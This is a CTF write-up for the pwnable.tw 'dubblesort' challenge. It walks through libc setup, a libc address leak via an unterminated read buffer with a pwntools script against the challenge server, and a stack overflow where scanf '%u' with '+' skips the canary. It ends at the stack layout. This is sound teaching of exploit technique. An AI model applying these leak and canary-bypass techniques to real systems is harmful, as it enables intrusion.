# dubblesort (pwn, pwnable.tw, scanf + - vulnerability, buffer overflow)

Notes:
- binary given
- libc given
- ASLR enabled


## Enumeration
In the task we are given a binary which sorts provided numbers:

```bash
$ ./dubblesort 
What your name :Kostus
Hello Hello A
�	,How many numbers do you what to sort :4
Enter the 0 number : 4
Enter the 1 number : 2
Enter the 2 number : 1
Enter the 3 number : 1
Processing......
Result :
1 1 2 4
```

Before asking for numbers the binary asks user for his name and then displays it back to the user.
It seems that there is some leak to investigate there as we can see some non printable characters.

Opening the program under Ghidra we can find the pseudocode for the read/write username logic:

```c
int main() {
    [...]
    char name_buf [64];
    [...]
    __printf_chk(1,"What your name :");
    read(0,name_buf,0x40);
    __printf_chk(1,"Hello %s,How many numbers do you what to sort :",name_buf);
    [...]
}
```

Now everything is clear, developer forgot that read does not place NULL byte after reading user input. 
This means that the following printf would write until reaching \00 byte in memory. As we are working
with 32 bit binary this would happen less often then on 64 bit. Moreover the name_buf hasn't is filled
with some valus as memory allocated on stack is not being erased when declared. So chances are there 
is some pointer which let's us bypass ASLR.s

Let's start with trying this path. After all it will be nice to have something to start with!


## Setting up env

To do so we have to patch our binary so it uses provided libc. This can be done by:
- [ ] downloading respective dynamic linker (ex. ld-2.23.so)
- [ ] patching elf to make it use our dynamic linker
- [ ] setting LD_PRELOAD (ex. LD_PRELOAD=$PWD/libc.so)

I used a [ld2libc list](ld2libc_list.txt) which I found in one_gadget repo.

```
$ file files/libc_32.so.6 
files/libc_32.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-, BuildID[sha1]=d26149b8dc15c0c3ea8a5316583757f69b39e037, for GNU/Linux 2.6.32, stripped

$ cat ld2libc_list.txt | grep d26149b8dc15c0c3ea8a5316583757f69b39e037
libc-2.23-d26149b8dc15c0c3ea8a5316583757f69b39e037
```

Then I downloaded libc-2.23.so from [ubuntu.pkgs.org](https://ubuntu.pkgs.org/16.04/ubuntu-main-i386/libc6_2.23-0ubuntu3_i386.deb.html).

I extracted the package and placed ld-2.23.so in same folder the binary is:

```bash
$ dpkg-deb -x libc6_2.23-0ubuntu3_i386.deb extracted
$ mv extracted/lib/i386-linux-gnu/ld-2.23.so .

$ ls
ld-2.23.so  libc_32.so.6  libc6_2.23-0ubuntu3_i386.deb  extraced
```

So the first step is done!
- [x] downloading respective dynamic linker (ex. ld-2.23.so)
- [ ] patching elf to make it use our dynamic linker
- [ ] setting LD_PRELOAD (ex. LD_PRELOAD=$PWD/libc.so)

Now let's patch our elf.
I've uesd [patchelf](https://nixos.org/patchelf.html) program for it. It allows us to change dynamic linker in raw binary as well as rpath and other cool stuff.

In our case we only want to change dynamic linker:

```bash
$ patchelf --set-interpreter ./ld-2.23.so dubblesort
warning: working around a Linux kernel bug by creating a hole of 4096 bytes in ‘dubblesort’

$ ldd dubblesort
	linux-gate.so.1 (0xf7fd4000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dd1000)
	./ld-2.23.so => /lib/ld-linux.so.2 (0xf7fd6000)
```

Second step complited:
- [x] downloading respective dynamic linker (ex. ld-2.23.so)
- [x] patching elf to make it use our dynamic linker
- [ ] setting LD_PRELOAD (ex. LD_PRELOAD=$PWD/libc.so)

We will have to perform the third step every time when we run the binary:

```bash
$ LD_PRELOAD=$PWD/libc_32.so.6 ./dubblesort
```

or when inspecting under gdb (great way to check if we managed to set up everything correctly)

```gdb
$ LD_PRELOAD=$PWD/libc_32.so.6 gdb ./dubblesort
gef➤ start
gef➤ vmmap
Start      End        Offset     Perm Path
0x56555000 0x56556000 0x00000000 r-x /home/k/pwnabletw/dubblesort/dubblesort
0x56556000 0x56557000 0x00000000 r-- /home/k/pwnabletw/dubblesort/dubblesort
0x56557000 0x56558000 0x00001000 rw- /home/k/pwnabletw/dubblesort/dubblesort
0x56558000 0x56559000 0x00003000 rw- /home/k/pwnabletw/dubblesort/dubblesort
0xf7e1e000 0xf7fcb000 0x00000000 r-x /home/k/pwnabletw/dubblesort/libc_32.so.6
0xf7fcb000 0xf7fcc000 0x001ad000 --- /home/k/pwnabletw/dubblesort/libc_32.so.6
0xf7fcc000 0xf7fce000 0x001ad000 r-- /home/k/pwnabletw/dubblesort/libc_32.so.6
0xf7fce000 0xf7fcf000 0x001af000 rw- /home/k/pwnabletw/dubblesort/libc_32.so.6
0xf7fcf000 0xf7fd4000 0x00000000 rw- 
0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /home/k/pwnabletw/dubblesort/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rw- 
0xf7ffc000 0xf7ffd000 0x00022000 r-- /home/k/pwnabletw/dubblesort/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rw- /home/k/pwnabletw/dubblesort/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rw- [stack]
```

We can see that the patched binary loaded /home/k/pwnabletw/dubblesort/libc_32.so.6 meaning we successfuly compleated all three steps:
- [x] downloading respective dynamic linker (ex. ld-2.23.so)
- [x] patching elf to make it use our dynamic linker
- [x] setting LD_PRELOAD (ex. LD_PRELOAD=$PWD/libc.so)

## Back to leaking libc_base
Ok, so having setup the environment we can now try to leak the libc_base address. Let's open the binary and proceed to call to read so we can determinate address of name_buf (should be second argument).

and investigate the initial values stored in our name_buf.


```gdb
$ LD_PRELOAD=$PWD/libc_32.so.6 gdb ./dubblesort
gef➤ start
gef➤ ni # till we reach read
gef➤ context
───────────────────────────── stack ────
0xffffceb0│+0x0000: 0x00000000	 ← $esp
0xffffceb4│+0x0004: 0xffffceec  →  0x000030d7
───────────────────────────── code ─────
   0x56555a11 <main+78>        mov    DWORD PTR [esp], 0x0
 → 0x56555a18 <main+85>        call   0x56555630 <read@plt>
   ↳  0x56555630 <read@plt+0>     jmp    DWORD PTR [ebx+0xc]
      0x56555636 <read@plt+6>     push   0x0
      0x5655563b <read@plt+11>    jmp    0x56555620
gef➤ x/16wx 0xffffceec
0xffffceec:	0x000030d7	0xffffd1dc	0x0000002f	0x0000008e
0xffffcefc:	0x00000016	0x00008000	0xf7fce000	0xf7fcc244
0xffffcf0c:	0x56555601	0x565557a9	0x56556fa0	0x00000001
0xffffcf1c:	0x56555b72	0x00000001	0xffffcfe4	0xffffcfec
gef➤ vmmap
Start      End        Offset     Perm Path
0x56555000 0x56556000 0x00000000 r-x /home/k/pwnabletw/dubblesort/dubblesort
0x56556000 0x56557000 0x00000000 r-- /home/k/pwnabletw/dubblesort/dubblesort
0x56557000 0x56558000 0x00001000 rw- /home/k/pwnabletw/dubblesort/dubblesort
0x56558000 0x56559000 0x00003000 rw- /home/k/pwnabletw/dubblesort/dubblesort
0xf7e1e000 0xf7fcb000 0x00000000 r-x /home/k/pwnabletw/dubblesort/libc_32.so.6
0xf7fcb000 0xf7fcc000 0x001ad000 --- /home/k/pwnabletw/dubblesort/libc_32.so.6
0xf7fcc000 0xf7fce000 0x001ad000 r-- /home/k/pwnabletw/dubblesort/libc_32.so.6
0xf7fce000 0xf7fcf000 0x001af000 rw- /home/k/pwnabletw/dubblesort/libc_32.so.6
0xf7fcf000 0xf7fd4000 0x00000000 rw- 
0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /home/k/pwnabletw/dubblesort/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rw- 
0xf7ffc000 0xf7ffd000 0x00022000 r-- /home/k/pwnabletw/dubblesort/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rw- /home/k/pwnabletw/dubblesort/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rw- [stack]
```

So we can see that addresses 0xf7fcc244 and 0xf7fce000 belong to stack. I don't think we have 100% guarantee that they will be at a remote server, but we will check that. Therefore it is best to pick address 0xf7fcc244 as ASLR changes only most significant bytes and so if we leak address ending with 44 we will know that it is there.

```python3
# exp.py
def get_addr(offset):
    p.recvuntil(b'What your name :')
    p.send(b'A' * offset)
    resp = p.recvuntil(b',How many numbers do you what to sort :')
    prefix_len = len('Hello ') + offset
    libc_addr = u32(resp[prefix_len:prefix_len + 4])
    log.info("[x] Found address: " + hex(libc_addr))

p = remote('chall.pwnable.tw', 10101)
get_addr(28)
```

Let's run it:

```bash
$ python3 exp.py 
[+] Opening connection to chall.pwnable.tw on port 10101: Done
[*] [x] Found address: 0xf7726244
```

Ha, so we are lucky! Now we have libc_base address! And we havn't even almost looked at a reversed code!

Complite function for finding libc_base:

```python3
LIBC_ADDR_BUF_OFFSET = 28 # name_buf[12] = our addr from libc

def leak_libc():
    p.recvuntil(b'What your name :')

    payload = b'A' * LIBC_ADDR_BUF_OFFSET
    p.send(payload)

    resp = p.recvuntil(b',How many numbers do you what to sort :')
    prefix_len = len('Hello ') + LIBC_ADDR_BUF_OFFSET
    libc_addr = u32(resp[prefix_len:prefix_len + 4])
    libc_base = libc_addr - LIBC_ADDR_LIBC_BASE_OFFSET
    log.info("[x] Found libc_base address: " + hex(libc_base))

    return libc_base

p = remote('chall.pwnable.tw', 10101)
libc_base = leak_libc()
```

## Futher investigating
Now we can look for other vulnerabilities. Let's look at reconstructed part of main responsible for writing our numbers into some buffer (they must be stored somewhere as the program sorts them later on):

```c
undefined4 main(void)
{
    uint act_num;
    uint num_buf_ptr2;
    uint *num_buf_ptr;

    uint num_count;
    uint num_buf [8];
    char name_buf [64];

    [...]

    printf(1,"Hello %s,How many numbers do you what to sort :",name_buf);
    scanf("%u",&num_count);

    num_buf_ptr = num_buf;
    act_num = 0;
    do {
        printf(1,"Enter the %d number : ",act_num);
        scanf("%u",num_buf_ptr);
        act_num = act_num + 1;
        num_buf_ptr = num_buf_ptr + 1;
    } while (act_num < num_count);

    [...]
  }
}
```

So the program asks user how many numbers he wishes to sort and then reads and stores those numbers inside a buffer. And the buffer is of size 8! Meaning we just have a simple buffer overflow! Is that all we need? Well, unfortunetely NO :(

```bash
$ checksec dubblesort
[*] '/home/k/pwnabletw/dubblesort/dubblesort'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

As we can see we have canaries :/ 

I've spend hours trying to find a bug in sort algorithm but I couldn't find anything interesting. In the end I gave up and looked at a solution (so no credit for me for solving this challenge). It turns out the vulnerability is in `scanf("%u")` itself and how it treates '+', '-' characters.

Let consider following input:

```bash
$ LD_PRELOAD=$PWD/libc_32.so.6 ./dubblesort
What your name :K
Hello K
,How many numbers do you what to sort :8
Enter the 0 number : 0
Enter the 1 number : +
Enter the 2 number : 2
Enter the 3 number : 3
Enter the 4 number : 4
Enter the 5 number : 5
Enter the 6 number : 6
Enter the 7 number : 7
Processing......
Result :
0 2 3 4 5 6 7 4294954847
```

As we can see the num_buf[1] havn't been overwriten. This means that we can just HOP over the canary when performing buffer overflow attack.

The stack layout:

|Stack          |
|:-------------:|
|return address |
| ... 56bytes   |
|canary         |
|name_buf[63]   |
| ...           |
|name_buf[0]    |
|num_buf[7]     |
|  ...          |
|num_buf[0]     |
|num_count      |